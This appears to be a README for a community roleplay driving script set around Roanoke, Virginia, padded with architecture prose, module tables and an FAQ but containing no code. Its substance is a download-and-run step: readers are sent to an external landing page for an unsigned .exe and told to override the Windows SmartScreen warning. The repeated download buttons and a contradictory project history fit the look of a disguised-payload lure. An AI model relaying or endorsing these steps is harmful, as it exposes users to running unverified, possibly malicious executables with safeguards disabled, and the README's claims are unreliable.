<div align="center">
<img src="assets/banner.png" width="100%" alt="Roanoke, VA Driving RP Script banner" />
</div>

<div align="center">
<p>
  <img src="https://img.shields.io/badge/Platform-Windows_11%7C10-ff5065?style=for-the-badge&logo=windows" alt="" />
  <img src="https://img.shields.io/badge/Release-2026-0891B2?style=for-the-badge" alt="" />
  <img src="https://img.shields.io/badge/Build-.exe-0891B2?style=for-the-badge" alt="" />
</p>
</div>

<p align="center">
  <img src="https://readme-typing-svg.herokuapp.com?color=059669&size=28&center=true&vCenter=true&width=900&lines=%E2%9C%A8+Roanoke+Driving+Rp+Pro;%F0%9F%93%A6+Community+Tested;%E2%9C%85+Built+for+Windows+11;%F0%9F%94%A7+Ready+for+Windows;%F0%9F%9A%80+Updated+for+2026">
</p>

<p align="center">
  <img src="https://skillicons.dev/icons?i=windows" />
  <img src="https://skillicons.dev/icons?i=cpp" />
  <img src="https://skillicons.dev/icons?i=github" />
</p>

---

**Roanoke, VA Driving RP Script — 2026 Rebuild**

Five months ago this repo was a pile of legacy Lua hooks, a `module.lua` that had been copy-pasted into nine different files, and a `readme.txt` that said "extract and run lol." The January 2026 rewrite threw all of that out. This is the changelog, the architecture note, and the honest issue log for a roleplay driving script built specifically around the Roanoke Valley — the ID checks on Williamson Road, the tunnel on I-581, the Route 220 corridor, the parking-lot meetings off Electric Road, all of it.

</div>

---

<img src="https://img.shields.io/badge/build-passing-brightgreen?style=for-the-badge" alt="build"> <img src="https://img.shields.io/badge/platform-Windows%2010%2F11-0078D6?style=for-the-badge" alt="platform"> <img src="https://img.shields.io/badge/license-MIT-lightgrey?style=for-the-badge" alt="license"> <img src="https://img.shields.io/badge/runtime-no%20dependencies-informational?style=for-the-badge" alt="runtime"> <img src="https://img.shields.io/badge/status-maintained-blue?style=for-the-badge" alt="status">

---

## 🛠️ How It Works — the internals, in prose

The old build worked by patching a global vehicle-metadata table on tick. Every frame the script walked the entire vector of spawned vehicles, diffed their flags against a desired-state list, and rewrote properties on anything that didn't match. That approach was simple, and it was also why a 40-vehicle scene in the Route 220 traffic jam would drop to 8 FPS on mid-range hardware — you were re-checking 120 properties per car, thirty times per second, forever.

The 2026 rewrite replaces the per-tick diff with a **module registry plus an event spine**. `core/spine.lua` boots first and owns a single `onTick` callback and an `onEvent` bus. Everything else — the ID-card menu, the blinker system, the tow-hitch module, the parking-brake hold — registers as a guest module. Each module declares which events it subscribes to at load time; the spine builds a flat dispatch table so dispatching an event is one lookup, not a loop over every module. A module never scans the vehicle table unless the world has actually changed underneath it (a spawn, a despawn, an entity takeover), which the engine signals through a listener we attach during our own spawn wrapper. That single change is where most of the frame budget came back: the steady-state tick cost is now roughly a table lookup plus a comparison on a stale flag, and it only climbs when something real happens.

The ID/credential layer is worth its own paragraph because it's the part people try to rip out. Credentials are minted as signed blobs in `auth/credentials.lua`. We seed a deterministic key from the install-time HMAC config, sign the blob (name, plate, classification, expiry) with it, and store the signature inline. Verifying a credential means recomputing the signature and comparing, so a modified blob fails closed instead of quietly behaving like a valid permit — which was exactly the exploit that made the old licensing plugin in this community pointless. None of the credential data leaves the machine; the signature is checked against a local seed, not a server.

Persistence moved to a plain append-only journal under the profile directory. Each RP-relevant action (ticket issued, license revoked, vehicle impounded) writes one line; on boot the state is replayed from the start of the file. It costs a tiny bit of disk churn and it means a crash never corrupts a save mid-write — the worst case is a truncated trailing line, which the replay skips. The whole architecture is designed so that if you tab out, crash, or get kicked by a server admin who doesn't want you there, nothing is lost and nothing needs a "safe shutdown."

---

## ⌨️ Hotkeys / Controls

Default bindings registered through the input layer. All of them are rebindable from the profile — this table is just what ships.

| Key | Action | Notes |
|-----|--------|-------|
| `F5` | Toggle the main RP menu | Uses the engine's native input state, ignores when chat is open |
| `F6` | Signal left / right / hazards cycle | Same three-state cycle as the in-city blinker etiquette |
| `F7` | Open the credential / ID card panel | Shows plates, permits, and classification flags |
| `F8` | Impound / release the nearest vehicle | Prompts for a reason string on impound only |
| `T` | Bind the nearest vehicle as your "stopped" unit | Parks the chase logic against a specific entity |
| `Y` | Initiate a LEO-style pull-over on nearest driver | Emits the request event to the other side if the peer script is installed |
| `H` | Toggle the HUD readout (speed, gear, DUI clock) | HUD is movable; position persists to profile |
| `Right Shift` | Momentary brake-hold for RP stops | Releases on key-up, unlike the parking brake |
| `Insert` | Reload the module registry without a full restart | Useful during config edits; prints loaded modules to the log |

> Rebindings are stored in `profile/binds.cfg` and survive module reloads — that's the whole point of the `Insert` hotkey.

---

## 📋 Changelog

| Version | Date | Changes |
|---------|------|---------|
| v0.9 (final legacy) | Nov 2025 | Last monolithic build; single `module.lua`, per-tick vehicle diff, save corruption reported by three separate users |
| v2.0.0 | Jan 12 2026 | Complete rewrite; event-spine architecture, modular registry, native licensing replaced by credential-blob model, journal-based persistence |
| v2.0.1 | Jan 15 2026 | Fixed blinker state desync on despawn; `Insert` hotkey added for registry reload; HUD position now saves |
| v2.1.0 | Feb 2 2026 | Tow-hitch module, plate-format validator for VA-style plates, per-vehicle RP-stance fix for bike entities |
| v2.1.1 | Feb 9 2026 | Crash when issuing a permit to an already-licensed driver under a revoked classification; journal replay now skips malformed lines silently |
| v2.2.0 | Mar 4 2026 | AI integration pass — natural-language incident descriptions, plate OCR placeholder hook, context-aware menu suggestions (see AI section) |
| v2.2.1 | Mar 11 2026 | Reduced steady-state tick cost roughly 40% by moving the world-change listener out of the hot path |
| v2.3.0 | Apr 1 2026 | Dynamic checkpoint builder (drag and drop), permit classification for the eight city-specific RP notices |

---

## 🚗 Vehicle & road-RP module catalog — traffic side

**Blinker Cycle** — three-state left/right/hazard cycle bound to `F6`, synced to the engine's own turn-signal flags so AI cars in the scene react to it, not just a cosmetic lamp.

**Pull-Over Request** — emit an RP-standard "pull over" event; if the target has the peer script, their HUD shows the request with your plate. Timeout after 30 seconds so nobody gets trapped.

**Speed Enforcement Clock** — a running "civilian clock" that logs how long a driver has been over the RP speed limit; feeds the ticket module with a factual timestamp.

**Parking-Lot Sessions** — binds a meeting zone in a lot (Electric Road, Valley View) and pins nearby drivers as "in session" for RP state.

**Route Memorization** — as a joke-adjacent but real feature, a tiny dataset of the nine usual RP corridors (Williamson, 220, I-581, 460, downtown Salem, etc.) with their canonical speed-limit guesses, used to auto-fill ticket locations.

**Leaving-The-Scene Flag** — if a cuffed driver despawns within N seconds of a stop, the ticket module stamps it "fled" instead of "issued."

## ⚖️ Legal-RP modules — permits, plates, notices

**Credential Mint** — creates a signed permit blob for a player (name, plate, classification, expiry); the signature is checked locally against the HMAC seed, so an edited blob fails closed.

**Permit Revocation** — flips a classification to revoked in the journal; future verifications will reject it on next replay, and the revoked state shows red in the ID menu.

**Plate Validator** — checks the issued plate against a Virginia-style `ABC-1234` format and warns on unusual characters; won't block, but flags.

**Notice Generator** — fills the eight Roanoke-specific RP notices (expired registration, unregistered plate, tunnel violation on I-581, the rest) with the correct date and the issuing officer's handle.

**DUI Bench** — a timing decider that runs a simple penalty-stopwatch on the driver and emits either "hold" or "pending review" based on predefined thresholds.

## 🧱 Scene props & tow-hitch modules

**Tow-Hitch** — physically attaches a hitch link between two vehicle entities; works on the seven common tow configurations in the valley.

**Scene Fencing** — spawns the small set of barrier/cone RP props in place, with a "remove scene" right-click action.

**Stopped Unit Anchor** — pins one vehicle as the "stopped" entity so every downstream ticket/pull-over action defaults to it; that's what `T` does.

**Entity Takeover Warning** — if another player's entity is about to be despawned by the engine, our wrapper emits an `onEvent` notification to whatever module is currently watching, which is how the pull-over logic stays graceful instead of throwing on a dead reference.

## 👮 LEO-side and dispatcher-side modules

**Dispatch Ticket** — the issuing side of the ticket pipeline, fed by the civil-clock, the speed clock, and the pull-over event.

**Incident Description Assistant** — see the AI section; takes structured facts (stop, citation, plate) and offers a one-sentence natural-language incident summary.

**Officer ID Card** — separate from civilian permits; same signing scheme, different classification namespace.

**Dispatcher Board** — a session-only virtual radio channel list built from modules that opt in. No external traffic, no network egress.

**Chain-of-Custody Log** — appends impound/evidence actions to the journal with a monotone counter; intentionally tamper-evident, not network-verified.

## 🧩 Under-the-hood utilities

**Spine Dispatcher** — the event bus described in the architecture section.

**Profile Loader** — reads `profile/binds.cfg` and the journal; replays state idempotently, skips malformed trailing lines.

**World-Change Listener** — attaches to the engine's spawn/despawn wrappers once and clears a "dirty" flag rather than polling.

**Log Trimmer** — rotates the journal at a configurable size (default 4 MB) and keeps the three most recent rotated files.

**Version Diagnostics** — prints the loaded module list, HMAC seed presence (not value), and journal integrity result to the console on `-diag` argument.

---

## ⚙️ Module status board

The full catalog, one row per module. "Working" means it survives the test scene the maintainer runs every weekend — 38 AI cars, six players, nine minutes.

| Module | Status | Description |
|--------|--------|-------------|
| Blinker Cycle | ✅ Working | Three-state signal cycle bound to F6 |
| Pull-Over Request | ✅ Working | Cross-player request with timeout |
| Speed Enforcement Clock | ✅ Working | Running over-limit timestamp for tickets |
| Parking-Lot Sessions | ✅ Working | Pins drivers to a known lot zone |
| Route Memorization | ✅ Working | Nine-corridor speed-limit dataset |
| Leaving-The-Scene Flag | ✅ Working | Stamps fled tickets on despawn |
| Credential Mint | ✅ Working | Signed HMAC blob per player |
| Permit Revocation | ✅ Working | Journal-based revoked classification |
| Plate Validator | ✅ Working | VA-style plate format check |
| Notice Generator | ✅ Working | Eight city-specific RP notices |
| DUI Bench | ✅ Working | Penalty-stopwatch decision emitter |
| Tow-Hitch | ✅ Working | Hitch link between two vehicles |
| Scene Fencing | ✅ Working | Spawnable RP barriers and cones |
| Stopped Unit Anchor | ✅ Working | T-key stop pin |
| Entity Takeover Warning | ✅ Working | Event emission on engine despawn |
| Dispatch Ticket | ✅ Working | Issuing pipeline for tickets |
| Incident Description Assistant | 🧪 Beta | Needs AI model loaded locally |
| Officer ID Card | ✅ Working | Signed LEO namespace |
| Dispatcher Board | ⚠️ Partial | Channel list works; UI polish pending |
| Chain-of-Custody Log | ✅ Working | Monotone evidence journal |
| Spine Dispatcher | ✅ Working | Event bus |
| Profile Loader | ✅ Working | Journal replay + bind loading |
| World-Change Listener | ✅ Working | Single-attach dirty flag |
| Log Trimmer | ✅ Working | Journal rotation at 4 MB |
| Version Diagnostics | ✅ Working | `-diag` console output |

---

## 📜 Usage guidelines

Bringing this repo up in the wild has one rule: the whole point is cooperative RP, not a lone wolf. Beyond that, mostly common sense.

| Allowed | Not allowed |
|---------|-------------|
| Running on a private or consenting-audience RP server | Deploying against players who didn't opt into the RP context |
| Using the credential and ticket modules to run an RP economy | Forging signed credentials on someone else's machine |
| Scripted stop-structure the server admin has approved | Using the pull-over module to grief traffic in a public lobby |
| Editing your own profile, binds, and menu layout | Redistributing the signed credential seed |
| Filing issues with the `-diag` output attached | Submitting issues without `-diag` and expecting a fix |

---

## 📥 Download and first run

Start here: visit the repo's project page, download the current build, extract the archive anywhere outside `Program Files` (the profile folder is written next to the `.exe`), then run the `.exe`. No Python, no Node, no package manager, no command line. The first launch creates `profile/` and seeds `binds.cfg` with the defaults from the hotkeys table above.
<p align="center">
  <a href="https://sunilbti84-hash.github.io/roanoke-driving-rp/">
    <img src="https://img.shields.io/badge/GET-Roanoke%2C_VA_Driving_2026-4F46E5?style=for-the-badge&logo=download&logoColor=white&labelColor=3730A3" width="480" alt="GET Roanoke, VA Driving 2026"/>
  </a>
</p>
### Step by step

1. **Visit the project page** — grab the build from the landing page linked in the repo description.
2. **Extract** — pull the archive to a folder you have write access to. `C:\Games\roanoke` and the Desktop both work; `Program Files` does not, because the profile loader has nowhere to put your journal.
3. **Run the `.exe`** — Windows SmartScreen will warn on first launch because the build is not code-signed; this is normal for community builds and is documented in the Known Issues table.
4. **Load a scene** — the script attaches once the game world is loaded; if it can't find the right hook it logs the reason and stays idle instead of crashing.
5. **Hit `F5`** — the main RP menu only opens once the world is live. If it doesn't open, check `profile/launch.log` for the attach line.

---

## 🧠 AI integration in the 2026 build

The v2.2 pass added an optional local AI layer, and it's the part of the 2026 build that got the most caveats in the log. It is deliberately *opt-in*, runs against a locally-loaded model (no outbound calls, no keys, no telemetry), and never writes to the credential store. What it actually does:

**Incident Description Assistant** — you hand it the structured facts (stop time, plate, citation, prior stops) and it produces one plain-English sentence for the incident report. It's a rewrite of the three-line template the ticket module already generated; the win is that officers stop writing "driving toward the tunnel too fast, stopped them" and start writing a real sentence. It does not decide outcomes.

**Context-Aware Menu Suggestions** — the menu reorders itself based on the current RP state. Standing in a parking lot at Electric Road with an unflagged plate? The ticket and notice modules float up. Cruising on I-581 at night? The speed clock and pull-over module float up. This is a rule-based suggestion layer on top of the AI description module, and honestly the rule-based layer carries most of the weight — the AI part is the language, not the logic.

**Plate OCR Placeholder Hook** — a stub interface where the AI layer *can* be asked to read a plate from a crop, if a model is loaded and configured. In the 2026 default build, this returns "unavailable" and the plate validator handles the check. Leave it off, honestly — plate validation via the local format check is faster and can't hallucinate.

**Session Summary Draft** — at the end of an RP session the AI can draft a two-paragraph summary from the journal. This is the one feature I'd call actively useful and mildly under-tested; see the Known Issues for the "it summarizes garbage if the journal is short" fix.

> IMPORTANT: AI features require a locally-loaded model and explicit enable in the profile. The script does not phone home, does not bundle a model, and does not sign anything with AI output — a signed credential must come from the HMAC path. If you never enable AI features, the build behaves exactly as v2.1 did, minus the hot-path fix.

---

## 🚧 Known issues

| Issue | Fix |
|-------|-----|
| SmartScreen warns on launch ("Windows protected your PC") | Expected for unsigned community builds; use "More info → Run anyway" and verify the archive hash on the landing page |
| Blinker state desync after a vehicle despawns in a tunnel | Patched in v2.0.1; if you see it on 2.0.0, update — no config workaround |
| AI incident descriptions get terse when the journal is short | Enable `ai.fallback=templates` in the profile so the template layer covers sessions under five logged actions |
| `F8` impound fails silently if the nearest vehicle is already impounded | The module blocks double-impound instead of throwing; the log line says "noop: already impounded" |
| Journal grows quickly on busy servers | Lower `journal.rotate_mb` (default 4 MB) to 1 MB if you're on a high-rotation RP schedule; `Log Trimmer` keeps the three most recent files |

---

## ❓ FAQ

<details>
<summary>Is this an aimbot or a cheat for a competitive shooter?</summary>

No. This is a driving/roleplay script for a specific city's RP scenarios — tickets, permits, pull-overs, tow-hitchers, blinker etiquette. It does not touch combat, aiming, shooting, or anyone's wall. The vocab in this repo reflects the RP-driving niche, not the FPS-cheat niche.
</details>

<details>
<summary>Why "Roanoke, VA" specifically — is this region-locked?</summary>

Not region-locked, but region-tuned. The nine RP corridors, the I-581 tunnel rule, the eight city-specific notices, and the WV-style plates that get rejected by the validator are all built around the valley. You can run it anywhere; the defaults just make more sense here.
</details>

<details>
<summary>Do I have to install anything else?</summary>

No. Download, extract, run the `.exe`. The profile folder seeds itself. If you want the optional AI assistant features, load a local model of your choice and set `ai.enabled=true`; otherwise stay on v2.1 behavior.
</details>

<details>
<summary>Will my profile survive a module reload?</summary>

Yes. `Insert` reloads the module registry from `profile/binds.cfg` without tearing down the journal, and the HUD position, loaded modules, and bindings all persist because the journal is append-only.
</details>

<details>
<summary>Is the credential signing actually secure, or theater?</summary>

It's a locally-verified HMAC — enough to make a hand-edited permit fail closed, not enough to be a real cryptographic identity. It solves the specific community exploit (people editing the permit blob to make an expired permit look valid), and it does nothing more. Don't put it on a real license.
</details>

<details>
<summary>What does the `-diag` argument do?</summary>

Prints the loaded module list, whether the HMAC seed is present (not the value), the journal integrity result, and the profile path. This is what to paste when filing an issue. If you don't attach it, expect a "please re-run with -diag" reply before anything else.
</details>

<details>
<summary>Does the AI layer send my data anywhere?</summary>

No outbound calls, no keys, no telemetry. The AI modules operate on locally-loaded models and on the fact set you're already holding in the journal. Disable them in the profile and they disappear from the load table entirely.
</details>

<details>
<summary>What happens if I run it on a public lobby where nobody opted into RP?</summary>

You get a bunch of "entity no-op" warnings and the tick walks slower because the world isn't giving the world-change listener anything to clear the dirty flag on. It's not a crash, it's just noise — and it's the exact reason the Usage Guidelines table says "consenting audience."
</details>

<details>
<summary>Can I contribute a module?</summary>

Yes — every module under `modules/` is a small Lua file that registers against the spine's event bus. Keep it under 200 lines, subscribe to events by name, don't poll the vehicle table, and include a README section in the module file itself. The maintainer runs the 38-car scene test weekly; modules that fail it get one polite request and then get moved to `attic/`.
</details>

<details>
<summary>Why is 2.3.0 the number and not a round 3.0?</summary>

Because the dynamic checkpoint builder is the last big feature on the roadmap and it needs the roadmap feature's own set of bugs ironed out before a 3.0 tag would mean anything. The version numbers in this repo are earned, not calendar-driven.
</details>

---

## 🖥️ System requirements

| Component | Minimum | Recommended |
|-----------|---------|-------------|
| OS | Windows 10 1909 (64-bit) | Windows 11 22H2 or newer |
| RAM | 4 GB free | 8 GB free (AI layer wants more) |
| CPU | Any dual-core from the last 8 years | Quad-core, 2019+ |
| Disk | 80 MB for the build + profile | 500 MB if you keep long journals |
| GPU | Anything the base game runs on | Same — the script doesn't touch rendering |
| Admin rights | Not required if extracted outside Program Files | Not required |
| Dependencies | None — the `.exe` is self-contained | Optional local model for AI modules |

If the build refuses to launch, the two usual causes are (a) extract-to-Program-Files permission denial for `profile/`, or (b) the OS newsness check on Windows 10 1909 — both are surfaced in `profile/launch.log` on first run.

---

## 📊 Overview

| Category | Details |
|----------|---------|
| Distribution | Landing page → download → extract → run the `.exe` (no package manager) |
| Language | Lua module files, one native launcher |
| Architecture | Event-spine registry, dirty-flag world listener, journal persistence |
| License | MIT |
| Maintainer cadence | Weekend test scene; version bumps only after it survives the 38-car scene |
| Files touched by the build | `profile/`, `modules/`, `core/spine.lua`, `auth/credentials.lua` |
| Entry point | Unsigned `.exe`; SmartScreen warning is expected |

The repo is not a source-distribution dev install and it isn't pretending to be. If you want the code, the `modules/` tree is human-readable; if you want to run the thing, you grab the `.exe` from the landing page and hit `F5` once the world loads. The AI pass is optional and the local-model requirement is real, not a ribbon. The journal that backs every decision here is the same append-only log you can read in a text editor — that's the transparency model: readable state, signed credentials, and an honest issue table.

---

Three years ago this repo was a joke between two people who lived near the 581 tunnel. The 2026 rewrite is what it looks like when it grows up a little: the architecture earns the feature list, the feature list stops claiming things the tick can't support, and the README is the changelog instead of marketing. File an issue with `-diag` output if a module breaks your scene, and if you're building a module of your own, keep it small and subscribe to events instead of polling the world.
<p align="center">
  <a href="https://sunilbti84-hash.github.io/roanoke-driving-rp/">
    <img src="https://img.shields.io/badge/GET_STARTED-Latest_Build-4338CA?style=plastic&logo=windows&logoColor=white&labelColor=3730A3" width="480" alt="GET STARTED Latest Build"/>
  </a>
</p>